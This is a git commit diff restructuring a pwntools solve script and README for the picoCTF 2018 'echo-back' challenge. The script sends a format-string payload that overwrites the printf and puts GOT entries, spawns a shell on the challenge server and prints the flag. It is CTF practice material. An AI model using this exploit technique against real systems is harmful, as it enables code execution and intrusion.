bc4737853b6bbe8ae03bac6db38da7074fae96e7
Lzu Tao <1stpangu@gmail.com>
2018-10-19 11:11:44 +0700

    pico2018: Restructure solve.py and update its README in pwn/echo-back challenge
    Signed-off-by: Lzu Tao <1stpangu@gmail.com>

--- pico2018/pwn/echo-back/README.md
+++ pico2018/pwn/echo-back/README.md
@@ -17,16 +17,16 @@ Connect to it with nc 2018shell2.picoctf.com 37402.
 Format string:
 
 ```sh
-% py solve.py REMOTE
-[*] '/home/phaptc/ctf/pico18/pwn/echo-back/echoback'
+$ py solve.py REMOTE
+[*] '/home/zzzz/pico18/pwn/echo-back/echoback'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
 [*] Trying to write:
-    0x0804a010 : 0x08048460
-    0x0804a01c : 0x080485ab
+    0x804a010 : 0x8048460
+    0x804a01c : 0x80485ab
 [+] Opening connection to 2018shell2.picoctf.com on port 37402: Done
 [+] Here're your shell!
 [*] Switching to interactive mode
@@ -37,7 +37,6 @@ drwxr-x--x 576 root       root        53248 Sep 30 03:50 ..
 -rw-rw-r--   1 hacksports hacksports    364 Sep 28 07:45 echoback.c
 -r--r-----   1 hacksports echo-back_0    54 Sep 28 07:45 flag.txt
 -rwxr-sr-x   1 hacksports echo-back_0   116 Sep 28 07:45 xinet_startup.sh
-input your message:
 $ cat flag.txt
 picoCTF{foRm4t_stRinGs_aRe_3xtra_DanGer0us_ee5a92ac}
 ```
--- pico2018/pwn/echo-back/solve.py
+++ pico2018/pwn/echo-back/solve.py
@@ -1,52 +1,73 @@
 #! /usr/bin/env python
-import sys
+import os
 #
 from pwn import context, p32, u32, log, process, remote, args
 from pwn import ELF, fmtstr_payload
 context.clear(arch='i386', os='linux')
 
 
-class ExploitInfo:
-    host        = '2018shell2.picoctf.com'
-    port        = 37402
-    name        = 'echoback'
-    elf         = ELF(name)
-    fmt_offset  = 7
+HERE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 
-def get_process():
-    r = None
-    if args.REMOTE:
-        r = remote(ExploitInfo.host, ExploitInfo.port)
-    else:
-        r = process('./%s' % ExploitInfo.name)
-        if args.GDB:
-            gdb.attach(r.pid, ExploitInfo.gdb)
+class Attack:
+    def __init__(self, host, port, elf_name, libc_name=None, ld_linux_name=None, gdb_script=None):
+        self.host, self.port = host, port
+        self.elf_name, self.libc_name = elf_name, libc_name
+        self.ld_linux_name = ld_linux_name
+        self.gdb_script = gdb_script
 
-    return r
+        self.elf = ELF(self.elf_name)
+
+        if libc_name:
+            self.libc = ELF(self.libc_name)
+
+        self.p = None
 
 
-def main():
-    e = ExploitInfo.elf
-    writes = {
-        e.got['printf']   : e.symbols['system'],
-        e.got['puts']     : e.symbols['vuln'],
-    }
+    def get_process(self, ld_preload=False, ld_linux=False):
+        p = None
+        if args.REMOTE:
+            p = remote(self.host, self.port)
+        else:
+            env = {'LD_PRELOAD': self.libc_name} if ld_preload else None
+            argv = []
+            if ld_linux:
+                argv.append(self.ld_linux_name)
 
-    log.info("Trying to write:")
-    for x in writes:
-        log.indented("0x%08x : 0x%08x", x, writes[x])
+            argv.append(self.elf_name)
+            p = process(argv, env=env)
+            if args.GDB:
+                gdb.attach(p.pid, self.gdb_script)
+        return p
 
-    payload = fmtstr_payload(ExploitInfo.fmt_offset, writes, write_size='short')
-    p = get_process()
 
-    p.clean()
-    p.sendline(payload)
-    log.success('Here\'re your shell!')
-    p.clean(timeout = 1)
-    p.sendline('ls -la')
-    p.interactive()
+    def exploit(self):
+        OFFSET_fmt  = 7
+        elf = self.elf
+        writes = {
+            elf.got['printf'] : elf.symbols['system'],
+            elf.got['puts'] : elf.symbols['vuln'],
+        }
+
+        log.info("Trying to write:")
+        for x in writes:
+            log.indented("%s : %s", hex(x), hex(writes[x]))
+
+        payload = fmtstr_payload(OFFSET_fmt, writes, write_size='short')
+
+        with self.get_process() as self.p:
+            self.p.sendlineafter('message:\n', payload)
+
+            self.p.clean(timeout=1)
+            self.p.sendline('/bin/sh')
+            self.p.sendline('ls -la')
+            log.success('Here\'re your shell!')
+            self.p.interactive()
 
 
 if __name__ == "__main__":
-    main()
+    host, port = '2018shell2.picoctf.com', 37402
+    elf_name = 'echoback'
+    elf_name = os.path.join(HERE_DIR, elf_name)
+    attack = Attack(host, port, elf_name)
+    attack.exploit()
